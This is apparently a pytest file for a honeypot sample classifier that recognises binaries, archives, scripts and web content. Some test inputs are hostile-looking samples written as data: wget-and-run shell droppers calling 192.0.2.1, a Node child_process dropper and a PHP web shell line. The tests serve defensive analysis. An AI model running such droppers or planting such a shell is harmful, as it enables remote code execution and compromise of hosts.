from __future__ import annotations

import struct

from suckerpot_analysis import WEB_KINDS, identify

from .conftest import make_elf, make_pe


def test_elf_x86_64_dynamic_with_symbols() -> None:
    info = identify(make_elf(interp=True, symtab=True))
    assert (info.kind, info.arch, info.bits, info.endian) == ("elf", "x86-64", 64, "little")
    assert info.linking == "dynamic"
    assert info.stripped is False


def test_elf_arm_static_stripped() -> None:
    info = identify(make_elf(machine=40, bits=32))
    assert (info.arch, info.bits, info.linking, info.stripped) == ("arm", 32, "static", True)


def test_elf_mips_big_endian() -> None:
    info = identify(make_elf(machine=8, bits=32, little=False))
    assert (info.arch, info.endian) == ("mips", "big")


def test_elf_machines() -> None:
    for machine, arch in [(183, "aarch64"), (20, "ppc"), (2, "sparc"), (4, "m68k"), (42, "superh")]:
        assert identify(make_elf(machine=machine)).arch == arch


def test_elf_truncated_headers_do_not_raise() -> None:
    full = make_elf(interp=True)
    for cut in range(0, len(full), 7):
        info = identify(full[:cut])
        assert info.kind in {"elf", "data", "text"}


def test_elf_huge_counts_are_capped() -> None:
    data = bytearray(make_elf())
    struct.pack_into("<H", data, 56, 0xFFFF)  # e_phnum
    struct.pack_into("<Q", data, 32, 1 << 62)  # e_phoff far past the end
    info = identify(bytes(data))
    assert info.kind == "elf"
    assert info.linking is None


def test_pe() -> None:
    info = identify(make_pe())
    assert (info.kind, info.arch, info.bits, info.is_dll) == ("pe", "x86-64", 64, False)
    dll = identify(make_pe(machine=0x14C, magic=0x10B, dll=True))
    assert (dll.arch, dll.bits, dll.is_dll) == ("x86", 32, True)


def test_pe_bad_lfanew() -> None:
    data = b"MZ" + b"\x00" * 58 + struct.pack("<I", 0xFFFFFFF0)
    assert identify(data).kind == "data"


def test_macho() -> None:
    data = b"\xcf\xfa\xed\xfe" + struct.pack("<I", 0x0100000C) + b"\x00" * 24
    info = identify(data)
    assert (info.kind, info.arch, info.bits) == ("macho", "aarch64", 64)


def test_archives() -> None:
    assert identify(b"\x1f\x8b\x08" + b"\x00" * 20).kind == "gzip"
    assert identify(b"PK\x03\x04" + b"\x00" * 20).kind == "zip"
    assert identify(b"\xfd7zXZ\x00" + b"\x00" * 20).kind == "xz"
    assert identify(b"7z\xbc\xaf\x27\x1c" + b"\x00" * 20).kind == "7z"
    assert identify(b"BZh9" + b"\x00" * 20).kind == "bzip2"
    assert identify(b"\x00" * 257 + b"ustar" + b"\x00" * 20).kind == "tar"


def test_scripts_and_text() -> None:
    sh = identify(b"#!/bin/sh\nwget http://192.0.2.1/x\n")
    assert (sh.kind, sh.interpreter) == ("script", "sh")
    env = identify(b"#!/usr/bin/env python3\nprint(1)\n")
    assert env.interpreter == "python3"
    assert identify(b"cd /tmp; wget http://192.0.2.1/a; chmod 777 a").kind == "script"
    assert identify(b"hello world, nothing to see here").kind == "text"
    assert identify(bytes(range(256)) * 4).kind == "data"
    assert identify(b"").kind == "data"


def test_upx_marker() -> None:
    packed = make_elf(body=b"\x00" * 64 + b"UPX!" + b"\x00" * 64)
    assert identify(packed).packer == "upx"
    assert identify(make_elf()).packer is None


HTML_PAGE = (
    b'<!DOCTYPE html>\n<html lang="en"><head><meta charset="utf-8"><title>Example</title>'
    b'<link rel="stylesheet" href="https://cdn.example.test/app.css">'
    b'<script src="https://cdn.example.test/app.js"></script></head>'
    b"<body><a href='https://www.example.test/page'>link</a></body></html>"
)
SVG_IMAGE = (
    b'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" '
    b'viewBox="0 0 8 8"><path d="M0 0h8v8z"/></svg>'
)
CSS_SHEET = (
    b"/* theme */\n:root{--a:#fff}body{margin:0;color:#111}.card{padding:4px}a:hover{color:red}"
)
JS_BUNDLE = (
    b'"use strict";(self.webpackChunkapp=self.webpackChunkapp||[]).push([[1],{1:function(e,t){'
    b'var n=document.getElementById("root");const r=window.location;t.exports=function(){return n}}}]);'
)
JSON_DOC = b'{"ip": "203.0.113.9", "links": ["https://api.example.test/v1"], "ok": true}\n'


def test_web_content_kinds() -> None:
    assert identify(HTML_PAGE).kind == "html"
    assert identify(b"\xef\xbb\xbf  \n<html><body>hi</body></html>").kind == "html"
    assert identify(b"<!-- 404 --><h1>Not found</h1><p>nothing here</p>").kind == "html"
    assert identify(SVG_IMAGE).kind == "svg"
    assert identify(b'<svg xmlns="http://www.w3.org/2000/svg"></svg>').kind == "svg"
    assert identify(b'<?xml version="1.0"?><rss version="2.0"><channel/></rss>').kind == "xml"
    assert identify(b'<?xml version="1.0"?><!DOCTYPE html><html><body/></html>').kind == "html"
    assert identify(CSS_SHEET).kind == "css"
    assert identify(b'@charset "utf-8";\n@import url(a.css);').kind == "css"
    assert identify(JS_BUNDLE).kind == "javascript"
    assert identify(JSON_DOC).kind == "json"
    assert identify(b'[{"id": 1}, {"id": 2}]').kind == "json"


def test_web_kinds_are_the_declared_set() -> None:
    samples = [HTML_PAGE, SVG_IMAGE, CSS_SHEET, JS_BUNDLE, JSON_DOC]
    assert {identify(s).kind for s in samples} <= WEB_KINDS


def test_web_content_in_other_encodings_and_languages() -> None:
    page = "<!doctype html><html><head><title>日本語のページ</title></head><body>テキスト</body></html>"
    assert identify(page.encode()).kind == "html"
    assert identify(page.encode()[:-10]).kind == "html"  # a page cut short is still a page


def test_programs_never_become_web_content() -> None:
    # A shebang always wins, even when the body looks like a web page or a JS bundle.
    assert identify(b"#!/bin/sh\n" + HTML_PAGE).kind == "script"
    assert identify(b"#!/usr/bin/env node\n" + JS_BUNDLE).kind == "script"
    # Shell commands without a shebang stay a script.
    dropper = b"cd /tmp; wget http://192.0.2.1/a.sh; chmod +x a.sh; ./a.sh"
    assert identify(dropper).kind == "script"
    assert identify(b"echo hello\nexport PATH=/usr/bin\n").kind == "script"
    # A Node dropper that looks like JavaScript but runs commands keeps the script kind.
    node = (
        b'"use strict";const cp=require("child_process");const f=function(){'
        b'cp.exec("wget http://192.0.2.1/a -O /tmp/a")};f();'
    )
    assert identify(node).kind != "javascript"
    # PHP is a program, with or without HTML around it.
    assert identify(b"<?php echo 1; ?>").kind not in WEB_KINDS
    assert identify(b"<html><body><?php system($_GET['c']); ?></body></html>").kind not in WEB_KINDS
    # One `function` in a shell script is not JavaScript.
    assert identify(b"function usage() {\n  echo usage\n}\nusage\n").kind not in WEB_KINDS


def test_plain_text_stays_text() -> None:
    assert identify(b"203.0.113.9\n").kind == "text"
    assert identify(b"{ not json at all").kind == "text"
    assert identify(b"[section]\nkey=value\n").kind == "text"
    assert identify(b"<tag-without-html-meaning>x</tag-without-html-meaning>").kind == "text"
